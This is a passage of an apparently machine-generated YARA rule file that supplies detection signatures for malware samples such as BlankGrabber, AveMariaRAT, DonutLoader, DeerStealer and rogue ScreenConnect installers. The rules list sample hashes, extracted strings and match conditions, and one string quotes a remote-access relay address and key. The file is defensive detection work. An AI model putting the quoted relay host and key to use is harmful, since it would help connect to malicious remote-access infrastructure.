      $s1 = "# K-.N_TG y~.K X\\.UZD].E q D.l.P.1iTyu ofSsU{ C z.4.v.t- U_I_g.7: t_jv.l e.V_L t z F S b.JUjC " fullword ascii /* score: '15.00'*/
      $s2 = "P n Q p k Q vU i3D.s_uw.AC@o+ S{ YR8D G_VQMQ.G_l L?L_Tc_o u.C_qTX.g.iU.Vuu.s" fullword ascii /* score: '11.00'*/
      $s3 = "$NM.i%.I.U1.h B z_g.G_H.kvq.Q_W h:} VE u qV+ Iff G Af em_HEEv&_x_b@c.A9_G v.X1-.V h.0_j.T_f_h" fullword ascii /* score: '11.00'*/
      $s4 = "_q!.K_N D b.5k.y/S.0_V w Y.Q.BK RCSO** c.h_c-.PeX_Vl y S/;y.U.cw.Wru+_b.cV_w ny_tV_e XM.W#_S_X" fullword ascii /* score: '11.00'*/
      $s5 = "A.g+u.6*.L_CZiT.Sj g Tk.zH1=),.C_G i+;y.F_c* k_kU Sl Q z2_M.Ne.FCl.Fh v_r.l" fullword ascii /* score: '11.00'*/
      $s6 = " kSm x.eU X.Tl A_v.Z_v.y.nal k* TUxN_X_b_N4_q.N8.r_J~_vL.b_SA_bV4" fullword ascii /* score: '11.00'*/
      $s7 = "XP+_T.Gs!7_D_t C.a c L>.0~ r.Y_v.a.S.Hi_D.b PU_XZDX/$[%I_A.P_mew T l j.r H* w b.Z.P B_W_T " fullword ascii /* score: '11.00'*/
      $s8 = " g.Pw A^.JEm kK~\\_De.V`_HPu.C_R} qiq.0.8.O.W_MvTT.0.8G.M vq_XHj.w- K.h_y.CN_ei.4|-" fullword ascii /* score: '11.00'*/
      $s9 = "]:_V_G_t.x.v zX* R.s.K| L.izz.UWC_l_y_Gv7.U y_H_f.c} C_L DF$.P w_sumK A T.T.r.W.C.E_n.y" fullword ascii /* score: '11.00'*/
      $s10 = "eh_p=.V F.ke.j#_i\\.mdE.w_TV_mNNL Y.2_yu g?.6 f b_J.D.P gV+ E.R i W,>_U>N) d.mC dE7" fullword ascii /* score: '11.00'*/
      $s11 = "t:\\.6 Q.W_e.h.DXp nd.r.f{ J.hH.G hCm!.Y.o.7.f Ai.n(.w_xr_c4.e.2.eU j.j k_E&&_J>-q." fullword ascii /* score: '10.00'*/
      $s12 = "R f_B$.atj:\\C0_b WV_P:.9_b HK_b_X_r3" fullword ascii /* score: '10.00'*/
      $s13 = "* K.IL_W^;4_W A.T.gB.J.s b.Z ZZd RK.W.M.R Y&{.3^_b m.z.V_Q_V_u a" fullword ascii /* score: '9.00'*/
      $s14 = "}.u.4{.zqj.H_b r;_k K_W_X D.R T f.x.5.g TM r_R.o.2 C L u I S.6 k,_nr.O9.d_I.M h6_P_v.SpY" fullword ascii /* score: '9.00'*/
      $s15 = " S TiRC.8.X_c:_D_l_QR= p A@.w.rT_km_A" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "cbbf0c0e5419f1056e401b8955cb07c0" and ( 8 of them )
      ) or ( all of them )
}

rule _BlankGrabber_signature__33742414196e45b8b306a928e178f844_imphash__dcaf48c1f10b0efa0a4472200f3850ed_imphash__1a88146b_dcaf48_10 {
   meta:
      description = "_subset_batch - from files BlankGrabber(signature)_33742414196e45b8b306a928e178f844(imphash).exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_1a88146b.exe, dcaf48c1f10b0efa0a4472200f3850ed(imphash)_a990bd13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b056c633ea73f56ebe83ea1030b4fc5e9d270eee6bb9b3de8b660fe40bf01cf"
      hash2 = "1a88146b43782a3547bcc06236a4b224592c1602a9691b58d60be1c08e4fa4b7"
      hash3 = "a990bd137feb5751e17c135c6b11fcaf6a7f09d1b3935b2d76ebfd0d53a2f027"
   strings:
      $s1 = "bpython313.dll" fullword ascii /* score: '23.00'*/
      $s2 = "9python313.dll" fullword ascii /* score: '23.00'*/
      $s3 = "blibcrypto-3.dll" fullword ascii /* score: '20.00'*/
      $s4 = "importlib.resources.abc)" fullword ascii /* score: '13.00'*/
      $s5 = "importlib.resources.readers)" fullword ascii /* score: '13.00'*/
      $s6 = "importlib.resources._common)" fullword ascii /* score: '13.00'*/
      $s7 = "importlib.resources._adapters)" fullword ascii /* score: '10.00'*/
      $s8 = "importlib.resources._itertools)" fullword ascii /* score: '10.00'*/
      $s9 = "TRnLIRC" fullword ascii /* score: '9.00'*/
      $s10 = "* wh\"b" fullword ascii /* score: '9.00'*/
      $s11 = "(''3)&>>3/" fullword ascii /* score: '9.00'*/ /* hex encoded string '3' */
      $s12 = "dodocog" fullword ascii /* score: '8.00'*/
      $s13 = "r.WgF+ " fullword ascii /* score: '8.00'*/
      $s14 = "Y$%s%i" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ConnectWise_signature__ConnectWise_signature__02f9c24b_ConnectWise_signature__3736f158_11 {
   meta:
      description = "_subset_batch - from files ConnectWise(signature).msi, ConnectWise(signature)_02f9c24b.msi, ConnectWise(signature)_3736f158.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3395bb897abb4315adc2f4de84f8586e488de531433c82b3208b84e65a161617"
      hash2 = "02f9c24b8b65fb02f6040e867822f7a013daa6ac1ed2664ac8a21f7a8511d31d"
      hash3 = "3736f158f14a152920163270add0c7b202650ea3524ab584e3ce91088e1bccb0"
   strings:
      $x1 = "Foreign key referencing Component that controls the file.FileNameFilenameFile name used for installation, may be localized.  Thi" ascii /* score: '61.00'*/
      $s2 = "ect.ClientService.dll24.3.7.90670ScreenConnect.Client.dll5aygg2n-.dll|ScreenConnect.Client.dllScreenConnect.Core.dllwj8nf_3w.dll" ascii /* score: '26.00'*/
      $s3 = "r.exe.configrfix2t3m.exe|ScreenConnect.ClientService.exehaqxzbdm.exe|ScreenConnect.ClientService.exexihnzjl9.dll|ScreenConnect.W" ascii /* score: '22.00'*/
      $s4 = "kstageShell.exeScreenConnect.WindowsBackstageShell.exe.configt2mskewp.con|ScreenConnect.WindowsBackstageShell.exe.configeqbfwkgi" ascii /* score: '22.00'*/
      $s5 = "tionsValidateProductIDProcessComponentsUnpublishFeaturesStopServicesVersionNTDeleteServicesRemoveRegistryValuesRemoveFilesWriteR" ascii /* score: '21.00'*/
      $s6 = "L_SCHEME]\\shell\\open\\command\"[INSTALLLOCATION]ScreenConnect.WindowsClient.exe\" \"%1\"reg3831C0C36D9CE44BC3E6FAE6F161BEA8Sys" ascii /* score: '20.00'*/
      $s7 = "nprocServer32[#ScreenConnect.WindowsCredentialProvider.dll]regBE7B0E97E26F674069B85EA56F7ED91AThreadingModelApartmentreg6D36DB0A" ascii /* score: '19.00'*/
      $s8 = "indowsAuthenticationPackage.dlldyfhtzmg.dll|ScreenConnect.WindowsCredentialProvider.dllDefaultIconFindRelatedProductsLaunchCondi" ascii /* score: '18.00'*/
      $s9 = "rule1.torrentmoviess.com&p=8041&k=BgIAAACkAABSU0ExAAgAAAEAAQA9H9F%2fugmnQqUiBQ1feIRDQYYlpnlsD0NfcTa5p7PRyJ4GAG1IbdSSFekaBv8PFCtA" ascii /* score: '17.00'*/
      $s10 = "xeScreenConnect.WindowsClient.exe.confighreu-cro.con|ScreenConnect.WindowsClient.exe.configgmo6xwtf.exe|ScreenConnect.WindowsBac" ascii /* score: '17.00'*/
      $s11 = "|ScreenConnect.Core.dllScreenConnect.Windows.dllxilmq3ru.dll|ScreenConnect.Windows.dllb0t6oyco.exe|ScreenConnect.WindowsClient.e" ascii /* score: '16.00'*/
      $s12 = "\\LsaAuthentication Packages[~][#ScreenConnect.WindowsAuthenticationPackage.dll]reg86A6324C5FADB6CB634CB54F9A254136CLSID\\[CREDE" ascii /* score: '16.00'*/
      $s13 = ".exe|ScreenConnect.WindowsFileManager.exeScreenConnect.WindowsFileManager.exe.configlisvqjw4.con|ScreenConnect.WindowsFileManage" ascii /* score: '14.00'*/
      $s14 = "egistryValuesInstallServicesStartServicesRegisterUserRegisterProductNOT REMOVE AND (Installed OR VersionNT > 500)RemoveExistingP" ascii /* score: '13.00'*/
      $s15 = "ease install the .NET Framework then run this installer again.REMOVE OR NOT NEW_VERSIONInstallation cannot continue. There is a " ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 29000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _BillGates_signature__BillGates_signature__2869d529_12 {
   meta:
      description = "_subset_batch - from files BillGates(signature).elf, BillGates(signature)_2869d529.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1421e5744e8e9c53d26f5c5d27fed9701de331e2c590e8dc824c4e7b0468f08"
      hash2 = "2869d529c43385893d1fe718a1b9aebb16009e4f7dca75f82bd402b92bdc9735"
   strings:
      $s1 = "ThreadMutex.cpp" fullword ascii /* score: '24.00'*/
      $s2 = "_ZN14CThreadHttpGet11ProcessMainEv" fullword ascii /* score: '23.00'*/
      $s3 = "ThreadHttpGet.cpp" fullword ascii /* score: '21.00'*/
      $s4 = "_ZN23CThreadKernelAtkExcutor11ProcessMainEv" fullword ascii /* score: '20.00'*/
      $s5 = "_ZN19CThreadShellRecycle11ProcessMainEv" fullword ascii /* score: '20.00'*/
      $s6 = "_ZN19CThreadFXConnection17GetFakeDetectPortEv" fullword ascii /* score: '20.00'*/
      $s7 = "_ZN8CManager19RecycleShellProcessEv" fullword ascii /* score: '20.00'*/
      $s8 = "_ZN17CThreadConnection17GetFakeDetectPortEv" fullword ascii /* score: '20.00'*/
      $s9 = "_ZN17CThreadFakeDetect11ProcessMainEv" fullword ascii /* score: '20.00'*/
      $s10 = "_ZN9__gnu_cxx10__mt_allocIP14CThreadHttpGetNS_20__common_pool_policyINS_6__poolELb1EEEED2Ev" fullword ascii /* score: '18.00'*/
      $s11 = "_ZN12CThreadMutex7TrylockEv" fullword ascii /* score: '18.00'*/
      $s12 = "_ZN14CThreadRecycle11ProcessMainEv" fullword ascii /* score: '18.00'*/
      $s13 = "_ZN18CFakeDetectPayloadC1Ev" fullword ascii /* score: '18.00'*/
      $s14 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s15 = "18CFakeDetectPayload" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__346c9b88ded843c92a3b0721fedbbd3d_imphash__AveMariaRAT_signature__c149ad8b73121762d33844ffa5c7ca51_im_13 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_346c9b88ded843c92a3b0721fedbbd3d(imphash).exe, AveMariaRAT(signature)_c149ad8b73121762d33844ffa5c7ca51(imphash).exe, b069d88b33e75313d6c2f825eb1f4188(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5066c7ce14b8a3cc419d9a3211b1e13e22b6376f8cec8c91f23767830de6a869"
      hash2 = "a868126d10484d16bad327ab13861c0a479a7d809a567d8623cf720d2c31022d"
      hash3 = "f33b9f92f7844ac3e037328500c492c231ad480658f63f5a3f306d4899b1509d"
      hash4 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $x1 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x3 = "System.Linq.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '31.00'*/
      $s4 = "4System.Private.CoreLib.dll" fullword ascii /* score: '29.00'*/
      $s5 = ":System.Private.TypeLoader.dll8System.Security.Cryptography" fullword ascii /* score: '28.00'*/
      $s6 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s7 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s8 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s10 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s11 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s12 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s14 = "Failed to allocate memory in target process" fullword wide /* score: '24.00'*/
      $s15 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__DeerStealer_signature__efd455830ba918de67076b7c65d86586_imph_14 {
   meta:
      description = "_subset_batch - from files CoinMiner(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe, DeerStealer(signature)_efd455830ba918de67076b7c65d86586(imphash)_7dfe8d25.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "41cae50c7c90025daf3d5c5c2028aceae4a6e74c65a2b66b8d3d9d0d7bfe7f8f"
      hash2 = "7dfe8d25b80b42ba7834c671f91956652ba929a239056bfc4321622eab60de3e"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s11 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s12 = "TComponent.GetObservers$0$Intf" fullword ascii /* score: '15.00'*/
      $s13 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s14 = "SetupMutex" fullword ascii /* score: '15.00'*/
      $s15 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__72d757a_15 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash3 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "sync.runtime_SemacquireRWMutexR" fullword ascii /* score: '21.00'*/
      $s2 = "sync.runtime_SemacquireRWMutex" fullword ascii /* score: '21.00'*/
      $s3 = ".attempts int; net.rotate bool; net.unknownOpt bool; net.lookup []string; net.err error; net.mtime time.Time; net.soffset uint32" ascii /* score: '20.00'*/
      $s4 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s5 = "sync/atomic.(*Pointer[go.shape.struct { net.servers []string; net.search []string; net.ndots int; net.timeout time.Duration; net" ascii /* score: '20.00'*/
      $s6 = "sync/atomic.(*Pointer[go.shape.struct { net.servers []string; net.search []string; net.ndots int; net.timeout time.Duration; net" ascii /* score: '20.00'*/
      $s7 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s8 = "q*func(*tls.Config, *tls.Certificate, *tls.clientHelloMsg, *tls.serverHelloMsg) (*tls.serverKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s9 = "f*func(*tls.Config, *tls.clientHelloMsg, *x509.Certificate) ([]uint8, *tls.clientKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s10 = "p*func(*tls.Config, *tls.clientHelloMsg, *tls.serverHelloMsg, *x509.Certificate, *tls.serverKeyExchangeMsg) error" fullword ascii /* score: '19.00'*/
      $s11 = "crypto/x509.SystemRootsError.Unwrap" fullword ascii /* score: '19.00'*/
      $s12 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
      $s13 = "*x509.SystemRootsError" fullword ascii /* score: '19.00'*/
      $s14 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s15 = "sync.(*RWMutex).rUnlockSlow" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_dd56a47d6b039b230286c0327d6693062fc843602ac0e3613_16 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "syscall.forkExecPipe" fullword ascii /* score: '21.00'*/
      $s2 = "on a locked thread with no template threadunexpected signal during runtime execution received but handler not on signal stack" fullword ascii /* score: '21.00'*/
      $s3 = "runtime: bad notifyList size - sync=signal arrived during cgo execution" fullword ascii /* score: '20.00'*/
      $s4 = "math.log" fullword ascii /* score: '19.00'*/
      $s5 = "vendor/golang.org/x/net/http/httpguts.headerValueContainsToken" fullword ascii /* score: '18.00'*/
      $s6 = "vendor/golang.org/x/net/idna.(*Profile).process" fullword ascii /* score: '18.00'*/
      $s7 = "vendor/golang.org/x/net/http2/hpack.getRootHuffmanNode" fullword ascii /* score: '18.00'*/
      $s8 = "net/textproto.(*Reader).upcomingHeaderKeys" fullword ascii /* score: '18.00'*/
      $s9 = "vendor/golang.org/x/net/http/httpguts.HeaderValuesContainsToken" fullword ascii /* score: '18.00'*/
      $s10 = "vendor/golang.org/x/net/http/httpguts.PunycodeHostPort" fullword ascii /* score: '18.00'*/
      $s11 = "debugReadLoggerf" fullword ascii /* score: '17.00'*/
      $s12 = "212223242526272829303132333435" ascii /* score: '17.00'*/ /* hex encoded string '!"#$%&'()012345' */
      $s13 = "vendor/golang.org/x/net/http2/hpack.(*Decoder).parseHeaderFieldRepr" fullword ascii /* score: '17.00'*/
      $s14 = "IIIIIIIIIII" fullword wide /* reversed goodware string 'IIIIIIIIIII' */ /* score: '16.50'*/
      $s15 = "ABCDEFGHIJ" fullword wide /* reversed goodware string 'JIHGFEDCBA' */ /* score: '16.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__72d757a_17 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
   strings:
      $s1 = "crypto/tls.(*ecdheKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s2 = "crypto/tls.rsaKeyAgreement.processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s3 = "crypto/tls.(*rsaKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s4 = "EncryptedClientHelloConfigList" fullword ascii /* score: '17.00'*/
      $s5 = "slices.Clone[go.shape.[]crypto/tls.keyShare,go.shape.struct { crypto/tls.group crypto/tls.CurveID; crypto/tls.data []uint8 }]" fullword ascii /* score: '17.00'*/
      $s6 = "slices.ContainsFunc[go.shape.[]crypto/tls.keyShare,go.shape.struct { crypto/tls.group crypto/tls.CurveID; crypto/tls.data []uint" ascii /* score: '17.00'*/
      $s7 = "crypto/tls.(*clientHandshakeStateTLS13).processHelloRetryRequest" fullword ascii /* score: '17.00'*/
      $s8 = "slices.IndexFunc[go.shape.[]crypto/tls.keyShare,go.shape.struct { crypto/tls.group crypto/tls.CurveID; crypto/tls.data []uint8 }" ascii /* score: '17.00'*/
      $s9 = "slices.ContainsFunc[go.shape.[]crypto/tls.keyShare,go.shape.struct { crypto/tls.group crypto/tls.CurveID; crypto/tls.data []uint" ascii /* score: '17.00'*/
      $s10 = "*tls.EncryptedClientHelloKey" fullword ascii /* score: '17.00'*/
      $s11 = "crypto/tls.(*clientHandshakeStateTLS13).processHelloRetryRequest.func1" fullword ascii /* score: '17.00'*/
      $s12 = "slices.IndexFunc[go.shape.[]crypto/tls.keyShare,go.shape.struct { crypto/tls.group crypto/tls.CurveID; crypto/tls.data []uint8 }" ascii /* score: '17.00'*/
      $s13 = "*[]tls.EncryptedClientHelloKey" fullword ascii /* score: '17.00'*/
      $s14 = "EncryptedClientHelloKeys" fullword ascii /* score: '17.00'*/
      $s15 = "crypto/x509.systemRootsPool.deferwrap1" fullword ascii /* score: '16.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DonutLoader_signature__492a5d3560401c2811de048088bf91d0_imphash__DonutLoader_signature__492a5d3560401c2811de048088bf91d0_im_18 {
   meta:
      description = "_subset_batch - from files DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash).exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash)_4e4a3751.exe, DonutLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash)_76889ef2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7c74d74c6d6a4ffc724a7800ddf18e165e582e2e4b0aace1b5266ec3d25a9775"
      hash2 = "4e4a3751581252e210f6f45881d778d1f482146f92dc790504bfbcd2bdfa0129"
      hash3 = "76889ef23dc327c0a63da2e296e079ce1f6844da185c3160402341557e6bccfa"
   strings:
      $s1 = "sfxzip.exe" fullword ascii /* score: '22.00'*/
      $s2 = "Setup=dwr.exe" fullword ascii /* score: '19.00'*/
      $s3 = "D:\\Projects\\WinRAR\\SFX\\build\\sfxzip64\\Release\\sfxzip.pdb" fullword ascii /* score: '19.00'*/
      $s4 = "dwr.exe" fullword ascii /* score: '19.00'*/
      $s5 = ";The comment below contains SFX script commands" fullword ascii /* score: '18.00'*/
      $s6 = "<html><head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\"></head>" fullword wide /* score: '17.00'*/
      $s7 = "winrarsfxpipe" fullword wide /* score: '14.00'*/
      $s8 = "This archive requires more than %u GB memory to unpack, which exceeds the amount of installed memory and can result in extremely" wide /* score: '14.00'*/
      $s9 = "configs.pdf" fullword ascii /* score: '13.00'*/
      $s10 = "gcsqqau" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "492a5d3560401c2811de048088bf91d0" and ( all of them )
      ) or ( all of them )
}

rule _c3a12b22ca7c4008d1f672194cc54520001e86d2fc1225c6e6c3615f7af6d676_c3a12b22_dc3f29ef63e49b65bcb6fd02d330063b_imphash__19 {
   meta:
      description = "_subset_batch - from files c3a12b22ca7c4008d1f672194cc54520001e86d2fc1225c6e6c3615f7af6d676_c3a12b22.exe, dc3f29ef63e49b65bcb6fd02d330063b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c3a12b22ca7c4008d1f672194cc54520001e86d2fc1225c6e6c3615f7af6d676"
      hash2 = "6717b2b73a373627960e979f9bc6596828fcfcbb472f2833fc34971b1c122bb1"
   strings:
      $s1 = "schannel: Failed to import cert file %s, password is bad" fullword ascii /* score: '23.50'*/
      $s2 = "SEC_E_ILLEGAL_MESSAGE (0x%08X) - This error usually occurs when a fatal SSL/TLS alert is received (e.g. handshake failed). More " ascii /* score: '23.00'*/
      $s3 = "Failed reading the chunked-encoded stream" fullword ascii /* score: '22.00'*/
      $s4 = "getFTPResponse -> result=%d, nread=%zd, ftpcode=%d" fullword ascii /* score: '21.50'*/
      $s5 = "Negotiate: noauthpersist -> %d, header part: %s" fullword ascii /* score: '21.50'*/
      $s6 = "download_write header(type=%x, blen=%zu) -> %d" fullword ascii /* score: '21.50'*/
      $s7 = "cr_mime_read(len=%zu) is errored -> %d, eos=0" fullword ascii /* score: '19.50'*/
      $s8 = "schannel: CertGetNameString() failed to match connection hostname (%s) against server certificate names" fullword ascii /* score: '19.00'*/
      $s9 = "smtp_doing() -> %d, done=%d" fullword ascii /* score: '18.50'*/
      $s10 = "smtp_do() -> %d, done=%d" fullword ascii /* score: '18.50'*/
      $s11 = "smtp_regular_transfer() -> %d, done=%d" fullword ascii /* score: '18.50'*/
      $s12 = "smtp_done(status=%d, premature=%d) -> %d" fullword ascii /* score: '18.50'*/
      $s13 = "smtp_perform() -> %d, connected=%d, done=%d" fullword ascii /* score: '18.50'*/
      $s14 = "Unable to read the interleaved parameter from Transport header: [%s]" fullword ascii /* score: '18.00'*/
      $s15 = "Authorization: %s4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" fullword ascii /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ConnectWise_signature__9771ee6344923fa220489ab01239bdfd_imphash__ConnectWise_signature__9771ee6344923fa220489ab01239bdfd_im_20 {
   meta:
      description = "_subset_batch - from files ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash).exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_9c150d19.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_d7231f53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f756bec198768208848f3cf30d4439c47bdfe58f0fbd27cd6570295edbeaed64"
      hash2 = "9c150d1942236b0550489577f9373f97294f5431b256e2c5d2f706589b47873d"
      hash3 = "d7231f539456fe65fbc9633f08e098e62558b33763787f07fe6d3bac054cfcf6"
   strings:
      $x1 = "lease install the .NET Framework then run this installer again.REMOVE OR NOT NEW_VERSIONInstallation cannot continue. There is a" ascii /* score: '41.00'*/
      $s2 = "%SystemRoot%\\SystemTemp" fullword wide /* score: '23.00'*/
      $s3 = "libwebp.dll" fullword wide /* score: '23.00'*/
      $s4 = "er.exe.configrfix2t3m.exe|ScreenConnect.ClientService.exehaqxzbdm.exe|ScreenConnect.ClientService.exexihnzjl9.dll|ScreenConnect." ascii /* score: '22.00'*/
      $s5 = "ckstageShell.exeScreenConnect.WindowsBackstageShell.exe.configt2mskewp.con|ScreenConnect.WindowsBackstageShell.exe.configeqbfwkg" ascii /* score: '22.00'*/
      $s6 = "<GetFullExecutablePath>b__135_1" fullword ascii /* score: '21.00'*/
      $s7 = "itionsValidateProductIDProcessComponentsUnpublishFeaturesStopServicesVersionNTDeleteServicesRemoveRegistryValuesRemoveFilesWrite" ascii /* score: '21.00'*/
      $s8 = "<GetProcessIDs>d__39" fullword ascii /* score: '20.00'*/
      $s9 = "<GetProcessIDs>d__41" fullword ascii /* score: '20.00'*/
      $s10 = "<TryGetProcessInfo>b__156_0" fullword ascii /* score: '20.00'*/
